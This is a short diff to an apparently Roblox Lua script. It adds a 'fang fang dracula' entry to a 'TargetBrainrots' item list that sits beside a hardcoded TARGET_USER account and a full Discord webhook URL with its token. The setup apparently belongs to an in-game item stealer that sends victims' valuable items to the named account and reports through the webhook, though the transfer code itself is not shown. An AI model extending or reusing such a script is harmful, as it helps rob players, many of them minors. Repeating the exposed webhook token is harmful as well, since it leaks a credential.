@@ -3,6 +3,7 @@ local TARGET_USER = "bloxfruitsnoobgive1"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1566541943260057600/OAu4V25E1cQ-kRsBgT-bbSQ_l68nyYD9_KUzk61NyFHB0-U5RaPbln8hJYDJvPq_TNoo"
 
 local TargetBrainrots = {
+    ["fang fang dracula"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
